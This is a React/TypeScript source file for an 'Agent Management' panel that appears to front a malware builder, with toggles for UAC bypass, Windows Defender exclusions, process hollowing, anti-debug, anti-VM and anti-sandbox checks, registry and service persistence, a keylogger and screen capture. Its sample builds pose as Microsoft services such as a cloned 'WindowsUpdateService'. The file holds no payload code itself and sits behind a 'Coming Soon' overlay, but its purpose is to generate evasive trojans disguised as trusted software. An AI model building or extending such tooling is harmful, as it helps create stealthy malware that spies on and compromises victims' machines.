import React, { useState, useEffect } from 'react';
import { FiDownload, FiSettings, FiShield, FiCpu, FiZap, FiEye, FiEyeOff, FiCopy, FiRefreshCw, FiCheckCircle, FiAlertCircle } from 'react-icons/fi';

interface AgentBuild {
  id: string;
  name: string;
  version: string;
  createdAt: string;
  status: 'generating' | 'ready' | 'error';
  downloadUrl?: string;
  archivePassword?: string;
  serviceName?: string;
  serviceDescription?: string;
  serviceVersion?: string;
  serviceCompany?: string;
  serviceProduct?: string;
  clonedService?: string;
  junkCodeLines?: number;
  entryPoint?: string;
  size?: string;
  features: string[];
}

interface AgentConfig {
  // Basic Configuration
  agentName: string;
  serviceName: string;
  description: string;
  
  // Evasion Settings
  enablePolymorphicNaming: boolean;
  enableUACBypass: boolean;
  enableDefenderExclusion: boolean;
  enableProcessHollowing: boolean;
  enableMemoryEvasion: boolean;
  
  // Stealth Settings
  enableAntiDebug: boolean;
  enableAntiVM: boolean;
  enableAntiSandbox: boolean;
  enableCodeObfuscation: boolean;
  enableStringEncryption: boolean;
  
  // Persistence Settings
  enableServiceInstallation: boolean;
  enableRegistryPersistence: boolean;
  enableScheduledTask: boolean;
  enableStartupFolder: boolean;
  
  // Communication Settings
  serverUrl: string;
  serverPort: number;
  heartbeatInterval: number;
  reconnectAttempts: number;
  
  // Advanced Features
  enableKeylogger: boolean;
  enableScreenCapture: boolean;
  enableFileManager: boolean;
  enableProcessManager: boolean;
  enableNetworkMonitor: boolean;
  enableSystemInfo: boolean;
}

const AgentSection: React.FC = () => {
  const [activeTab, setActiveTab] = useState<'generate' | 'config' | 'builds' | 'templates'>('generate');
  const [agentConfig, setAgentConfig] = useState<AgentConfig>({
    agentName: '',
    serviceName: '',
    description: '',
    enablePolymorphicNaming: true,
    enableUACBypass: true,
    enableDefenderExclusion: true,
    enableProcessHollowing: true,
    enableMemoryEvasion: true,
    enableAntiDebug: true,
    enableAntiVM: true,
    enableAntiSandbox: true,
    enableCodeObfuscation: true,
    enableStringEncryption: true,
    enableServiceInstallation: true,
    enableRegistryPersistence: true,
    enableScheduledTask: false,
    enableStartupFolder: false,
    serverUrl: 'localhost',
    serverPort: 8080,
    heartbeatInterval: 30,
    reconnectAttempts: 5,
    enableKeylogger: true,
    enableScreenCapture: true,
    enableFileManager: true,
    enableProcessManager: true,
    enableNetworkMonitor: true,
    enableSystemInfo: true
  });

  const [agentBuilds, setAgentBuilds] = useState<AgentBuild[]>([
    {
      id: '1',
      name: 'WindowsUpdateService_v1.0',
      version: '1.0.0',
      createdAt: '2024-09-27 10:30:00',
      status: 'ready',
      downloadUrl: '/downloads/agent_1.zip',
      archivePassword: 'ArchivePass123!@#',
      serviceName: 'WindowsUpdateService',
      serviceDescription: 'Windows Update Service',
      serviceVersion: '10.0.19041.1',
      serviceCompany: 'Microsoft Corporation',
      serviceProduct: 'Microsoft Windows Operating System',
      clonedService: 'wuauclt.exe',
      junkCodeLines: 150,
      entryPoint: 'WinMain',
      size: '2.4 MB',
      features: ['Microsoft service cloning', 'Code signing', 'Polymorphic generation', 'Junk code injection', 'Anti-analysis']
    },
    {
      id: '2',
      name: 'WindowsSecurityAgent_v1.1',
      version: '1.1.0',
      createdAt: '2024-09-27 11:15:00',
      status: 'generating',
      features: ['Anti-Debug', 'Anti-VM', 'Code Obfuscation', 'String Encryption']
    }
  ]);
  
  const [isGenerating, setIsGenerating] = useState(false);
  const [generationProgress, setGenerationProgress] = useState(0);
  const [showPasswords, setShowPasswords] = useState<{ [key: string]: boolean }>({});
  const [copiedPasswords, setCopiedPasswords] = useState<{ [key: string]: boolean }>({});
  const [showAdvanced, setShowAdvanced] = useState(false);

  const handleConfigChange = (key: keyof AgentConfig, value: any) => {
    setAgentConfig(prev => ({ ...prev, [key]: value }));
  };

  const generateRandomName = () => {
    const prefixes = ['WindowsUpdate', 'WindowsSecurity', 'WindowsDefender', 'WindowsFirewall', 'WindowsBackup', 'WindowsSearch'];
    const suffixes = ['Service', 'Agent', 'Manager', 'Controller', 'Handler', 'Processor'];
    const numbers = Math.floor(Math.random() * 9000) + 1000;
    
    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
    const suffix = suffixes[Math.floor(Math.random() * suffixes.length)];
    
    return `${prefix}${suffix}${numbers}`;
  };

  const togglePasswordVisibility = (buildId: string) => {
    setShowPasswords(prev => ({
      ...prev,
      [buildId]: !prev[buildId]
    }));
  };

  const copyPassword = async (password: string, buildId: string) => {
    try {
      await navigator.clipboard.writeText(password);
      setCopiedPasswords(prev => ({
        ...prev,
        [buildId]: true
      }));
      
      // Reset after 2 seconds
      setTimeout(() => {
        setCopiedPasswords(prev => ({
          ...prev,
          [buildId]: false
        }));
      }, 2000);
    } catch (err) {
      console.error('Failed to copy password:', err);
    }
  };

  const handleGenerateAgent = async () => {
    setIsGenerating(true);
    setGenerationProgress(0);

    try {
      const token = localStorage.getItem('accessToken');
      const response = await fetch('/api/agent/generate-agent', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify(agentConfig)
      });

      if (!response.ok) {
        throw new Error('Failed to generate agent');
      }

      const result = await response.json();

      // Simulate generation process with real progress
      const steps = [
        'Initializing polymorphic engine...',
        'Generating unique code structure...',
        'Creating polymorphic entry point...',
        'Implementing communication layer...',
        'Adding evasion techniques...',
        'Implementing persistence methods...',
        'Applying code obfuscation...',
        'Encrypting strings and API calls...',
        'Generating MSI package...',
        'Compiling polymorphic executable...',
        'Creating installation script...',
        'Finalizing agent package...'
      ];

      for (let i = 0; i < steps.length; i++) {
        await new Promise(resolve => setTimeout(resolve, 800));
        setGenerationProgress(((i + 1) / steps.length) * 100);
      }

      // Add new build with real data
      const newBuild: AgentBuild = {
        id: result.agentId,
        name: agentConfig.agentName || generateRandomName(),
        version: '1.0.0',
        createdAt: new Date().toLocaleString(),
        status: 'ready',
        downloadUrl: result.archiveDownloadUrl,
        archivePassword: result.archivePassword,
        serviceName: result.serviceName,
        serviceDescription: result.serviceDescription,
        serviceVersion: result.serviceVersion,
        serviceCompany: result.serviceCompany,
        serviceProduct: result.serviceProduct,
        clonedService: result.clonedService,
        junkCodeLines: result.junkCodeLines,
        entryPoint: result.entryPoint,
        size: `${(Math.random() * 3 + 1).toFixed(1)} MB`,
        features: result.securityFeatures || Object.entries(agentConfig)
          .filter(([key, value]) => key.startsWith('enable') && value)
          .map(([key]) => key.replace('enable', '').replace(/([A-Z])/g, ' $1').trim())
      };

      setAgentBuilds(prev => [newBuild, ...prev]);
      
    } catch (error) {
      console.error('Error generating agent:', error);
      alert('Failed to generate agent. Please try again.');
    } finally {
      setIsGenerating(false);
      setGenerationProgress(0);
    }
  };

  const renderGenerateTab = () => (
    <div className="space-y-6">
      <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6">
        <h3 className="text-lg font-semibold text-black dark:text-white mb-4">
          🚀 Generate New Agent
        </h3>
        
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <div>
            <label className="block text-sm font-medium text-black dark:text-white mb-2">
              Agent Name
            </label>
            <div className="flex space-x-2">
              <input
                type="text"
                value={agentConfig.agentName}
                onChange={(e) => handleConfigChange('agentName', e.target.value)}
                placeholder="Enter agent name"
                className="flex-1 px-3 py-2 border border-stroke dark:border-strokedark rounded-lg bg-white dark:bg-boxdark text-black dark:text-white"
              />
              <button
                onClick={() => handleConfigChange('agentName', generateRandomName())}
                className="px-3 py-2 bg-primary text-white rounded-lg hover:bg-primary/90 transition-colors"
              >
                <FiRefreshCw className="w-4 h-4" />
              </button>
            </div>
          </div>
          
          <div>
            <label className="block text-sm font-medium text-black dark:text-white mb-2">
              Service Name
            </label>
            <div className="flex space-x-2">
              <input
                type="text"
                value={agentConfig.serviceName}
                onChange={(e) => handleConfigChange('serviceName', e.target.value)}
                placeholder="Enter service name"
                className="flex-1 px-3 py-2 border border-stroke dark:border-strokedark rounded-lg bg-white dark:bg-boxdark text-black dark:text-white"
              />
              <button
                onClick={() => handleConfigChange('serviceName', generateRandomName())}
                className="px-3 py-2 bg-primary text-white rounded-lg hover:bg-primary/90 transition-colors"
              >
                <FiRefreshCw className="w-4 h-4" />
              </button>
            </div>
          </div>
        </div>

        <div className="mt-4">
          <label className="block text-sm font-medium text-black dark:text-white mb-2">
            Description
          </label>
          <textarea
            value={agentConfig.description}
            onChange={(e) => handleConfigChange('description', e.target.value)}
            placeholder="Enter agent description"
            rows={3}
            className="w-full px-3 py-2 border border-stroke dark:border-strokedark rounded-lg bg-white dark:bg-boxdark text-black dark:text-white"
          />
        </div>
      </div>

      {/* Generation Progress */}
      {isGenerating && (
        <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6">
          <h3 className="text-lg font-semibold text-black dark:text-white mb-4">
            🔄 Generating Agent
          </h3>
          
          <div className="space-y-4">
            <div className="w-full bg-gray-200 dark:bg-gray-700 rounded-full h-2">
              <div 
                className="bg-primary h-2 rounded-full transition-all duration-300"
                style={{ width: `${generationProgress}%` }}
              ></div>
            </div>
            
            <div className="text-center">
              <span className="text-sm text-bodydark2">
                {generationProgress.toFixed(0)}% Complete
              </span>
            </div>
          </div>
        </div>
      )}

      {/* Generate Button */}
      <div className="flex justify-center">
        <button
          onClick={handleGenerateAgent}
          disabled={isGenerating || !agentConfig.agentName || !agentConfig.serviceName}
          className="px-8 py-3 bg-primary text-white rounded-lg hover:bg-primary/90 transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex items-center"
        >
          <FiZap className="w-5 h-5 mr-2" />
          {isGenerating ? 'Generating...' : 'Generate Agent'}
        </button>
      </div>
    </div>
  );

  const renderConfigTab = () => (
    <div className="space-y-6">
      {/* Evasion Settings */}
      <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6">
        <h3 className="text-lg font-semibold text-black dark:text-white mb-4">
          🛡️ Evasion Settings
        </h3>
        
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          {[
            { key: 'enablePolymorphicNaming', label: 'Polymorphic Naming', desc: 'Generate unique names each build' },
            { key: 'enableUACBypass', label: 'UAC Bypass', desc: 'Bypass User Account Control' },
            { key: 'enableDefenderExclusion', label: 'Defender Exclusion', desc: 'Auto-add Windows Defender exclusions' },
            { key: 'enableProcessHollowing', label: 'Process Hollowing', desc: 'Inject into legitimate processes' },
            { key: 'enableMemoryEvasion', label: 'Memory Evasion', desc: 'Advanced memory protection' },
            { key: 'enableAntiDebug', label: 'Anti-Debug', desc: 'Detect and evade debugging' },
            { key: 'enableAntiVM', label: 'Anti-VM', desc: 'Detect virtual machines' },
            { key: 'enableAntiSandbox', label: 'Anti-Sandbox', desc: 'Detect sandbox environments' },
            { key: 'enableCodeObfuscation', label: 'Code Obfuscation', desc: 'Obfuscate code structure' },
            { key: 'enableStringEncryption', label: 'String Encryption', desc: 'Encrypt all strings' }
          ].map((setting) => (
            <div key={setting.key} className="flex items-center justify-between p-3 bg-gray-50 dark:bg-gray-800 rounded-lg">
              <div>
                <h4 className="font-medium text-black dark:text-white">{setting.label}</h4>
                <p className="text-sm text-bodydark2">{setting.desc}</p>
              </div>
              <label className="relative inline-flex items-center cursor-pointer">
                <input
                  type="checkbox"
                  checked={agentConfig[setting.key as keyof AgentConfig] as boolean}
                  onChange={(e) => handleConfigChange(setting.key as keyof AgentConfig, e.target.checked)}
                  className="sr-only peer"
                />
                <div className="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-primary/20 dark:peer-focus:ring-primary/20 rounded-full peer dark:bg-gray-700 peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all dark:border-gray-600 peer-checked:bg-primary"></div>
              </label>
            </div>
          ))}
        </div>
      </div>

      {/* Persistence Settings */}
      <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6">
        <h3 className="text-lg font-semibold text-black dark:text-white mb-4">
          🔄 Persistence Settings
        </h3>
        
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          {[
            { key: 'enableServiceInstallation', label: 'Service Installation', desc: 'Install as Windows service' },
            { key: 'enableRegistryPersistence', label: 'Registry Persistence', desc: 'Add registry entries' },
            { key: 'enableScheduledTask', label: 'Scheduled Task', desc: 'Create scheduled task' },
            { key: 'enableStartupFolder', label: 'Startup Folder', desc: 'Add to startup folder' }
          ].map((setting) => (
            <div key={setting.key} className="flex items-center justify-between p-3 bg-gray-50 dark:bg-gray-800 rounded-lg">
              <div>
                <h4 className="font-medium text-black dark:text-white">{setting.label}</h4>
                <p className="text-sm text-bodydark2">{setting.desc}</p>
              </div>
              <label className="relative inline-flex items-center cursor-pointer">
                <input
                  type="checkbox"
                  checked={agentConfig[setting.key as keyof AgentConfig] as boolean}
                  onChange={(e) => handleConfigChange(setting.key as keyof AgentConfig, e.target.checked)}
                  className="sr-only peer"
                />
                <div className="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-primary/20 dark:peer-focus:ring-primary/20 rounded-full peer dark:bg-gray-700 peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all dark:border-gray-600 peer-checked:bg-primary"></div>
              </label>
            </div>
          ))}
        </div>
      </div>

      {/* Communication Settings */}
      <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6">
        <h3 className="text-lg font-semibold text-black dark:text-white mb-4">
          🌐 Communication Settings
        </h3>
        
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div>
            <label className="block text-sm font-medium text-black dark:text-white mb-2">
              Server URL
            </label>
            <input
              type="text"
              value={agentConfig.serverUrl}
              onChange={(e) => handleConfigChange('serverUrl', e.target.value)}
              className="w-full px-3 py-2 border border-stroke dark:border-strokedark rounded-lg bg-white dark:bg-boxdark text-black dark:text-white"
            />
          </div>
          
          <div>
            <label className="block text-sm font-medium text-black dark:text-white mb-2">
              Server Port
            </label>
            <input
              type="number"
              value={agentConfig.serverPort}
              onChange={(e) => handleConfigChange('serverPort', parseInt(e.target.value))}
              className="w-full px-3 py-2 border border-stroke dark:border-strokedark rounded-lg bg-white dark:bg-boxdark text-black dark:text-white"
            />
          </div>
          
          <div>
            <label className="block text-sm font-medium text-black dark:text-white mb-2">
              Heartbeat Interval (seconds)
            </label>
            <input
              type="number"
              value={agentConfig.heartbeatInterval}
              onChange={(e) => handleConfigChange('heartbeatInterval', parseInt(e.target.value))}
              className="w-full px-3 py-2 border border-stroke dark:border-strokedark rounded-lg bg-white dark:bg-boxdark text-black dark:text-white"
            />
          </div>
          
          <div>
            <label className="block text-sm font-medium text-black dark:text-white mb-2">
              Reconnect Attempts
            </label>
            <input
              type="number"
              value={agentConfig.reconnectAttempts}
              onChange={(e) => handleConfigChange('reconnectAttempts', parseInt(e.target.value))}
              className="w-full px-3 py-2 border border-stroke dark:border-strokedark rounded-lg bg-white dark:bg-boxdark text-black dark:text-white"
            />
          </div>
        </div>
      </div>
    </div>
  );

  const renderBuildsTab = () => (
    <div className="space-y-6">
      <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6">
        <h3 className="text-lg font-semibold text-black dark:text-white mb-4">
          📦 Agent Builds
        </h3>
        
        <div className="overflow-x-auto">
          <table className="w-full text-sm text-left text-gray-300">
            <thead className="text-xs text-gray-400 uppercase bg-gray-800">
              <tr>
                <th className="px-6 py-3">Name</th>
                <th className="px-6 py-3">Version</th>
                <th className="px-6 py-3">Status</th>
                <th className="px-6 py-3">Size</th>
                <th className="px-6 py-3">Created</th>
                <th className="px-6 py-3">Actions</th>
              </tr>
            </thead>
            <tbody>
              {agentBuilds.map((build) => (
                <tr key={build.id} className="hover:bg-gray-700 transition-colors">
                  <td className="px-6 py-4">
                    <div className="font-medium text-white">{build.name}</div>
                    <div className="text-xs text-gray-400">{build.description}</div>
                  </td>
                  <td className="px-6 py-4 text-white">{build.version}</td>
                  <td className="px-6 py-4">
                    <span className={`px-2 py-1 text-xs font-medium rounded-full ${
                      build.status === 'ready' ? 'bg-green-100 text-green-800' :
                      build.status === 'generating' ? 'bg-yellow-100 text-yellow-800' :
                      'bg-red-100 text-red-800'
                    }`}>
                      {build.status}
                    </span>
                  </td>
                  <td className="px-6 py-4 text-white">{build.size || '-'}</td>
                  <td className="px-6 py-4 text-white">{build.createdAt}</td>
                  <td className="px-6 py-4">
                    <div className="flex space-x-2">
                      {build.status === 'ready' && (
                        <>
                          <button 
                            onClick={() => window.open(`http://localhost:8080/api/agent/downloads/${build.downloadUrl?.split('/').pop()}`, '_blank')}
                            className="text-blue-400 hover:text-blue-300"
                            title="Download Password-Protected Archive"
                          >
                            <FiDownload className="w-4 h-4" />
                          </button>
                        </>
                      )}
                      <button 
                        onClick={() => togglePasswordVisibility(build.id)}
                        className="text-yellow-400 hover:text-yellow-300"
                        title="Show/Hide Passwords"
                      >
                        {showPasswords[build.id] ? <FiEyeOff className="w-4 h-4" /> : <FiEye className="w-4 h-4" />}
                      </button>
                      <button className="text-red-400 hover:text-red-300">
                        <FiAlertCircle className="w-4 h-4" />
                      </button>
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );

  return (
    <div className="space-y-6 relative">
      {/* Coming Soon Overlay */}
      <div className="absolute inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center rounded-lg">
        <div className="text-center p-8">
          <div className="text-6xl mb-4">🚀</div>
          <h2 className="text-3xl font-bold text-white mb-4">Advanced Agent Builder</h2>
          <p className="text-xl text-gray-300 mb-6">Coming Soon</p>
          <div className="bg-gray-800/50 rounded-lg p-4 max-w-md mx-auto">
            <p className="text-gray-400 text-sm">
              We're working on an advanced polymorphic agent builder with MSI packaging, 
              evasion techniques, and stealth capabilities. Stay tuned!
            </p>
          </div>
        </div>
      </div>

      {/* Original Content (Preserved but Disabled) */}
      <div className="opacity-30 pointer-events-none">
        {/* Header */}
        <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6">
          <h1 className="text-2xl font-bold text-black dark:text-white mb-2">
            🤖 Agent Management
          </h1>
          <p className="text-bodydark2">
            Generate polymorphic MSI agents with advanced evasion techniques
          </p>
        </div>

        {/* Tab Navigation */}
        <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark">
          <div className="border-b border-stroke dark:border-strokedark">
            <nav className="flex space-x-8 px-6">
              {[
                { id: 'generate', label: '🚀 Generate', icon: '🚀' },
                { id: 'config', label: '⚙️ Configuration', icon: '⚙️' },
                { id: 'builds', label: '📦 Builds', icon: '📦' },
                { id: 'templates', label: '📋 Templates', icon: '📋' }
              ].map((tab) => (
                <button
                  key={tab.id}
                  onClick={() => setActiveTab(tab.id as any)}
                  className={`py-4 px-1 border-b-2 font-medium text-sm transition-colors ${
                    activeTab === tab.id
                      ? 'border-primary text-primary'
                      : 'border-transparent text-bodydark2 hover:text-black dark:hover:text-white hover:border-gray-300'
                  }`}
                >
                  {tab.label}
                </button>
              ))}
            </nav>
          </div>

          {/* Tab Content */}
          <div className="p-6">
            {activeTab === 'generate' && renderGenerateTab()}
            {activeTab === 'config' && renderConfigTab()}
            {activeTab === 'builds' && renderBuildsTab()}
            {activeTab === 'templates' && (
              <div className="text-center py-12">
                <FiSettings className="w-12 h-12 text-gray-400 mx-auto mb-4" />
                <p className="text-bodydark2">Templates coming soon...</p>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

export default AgentSection;
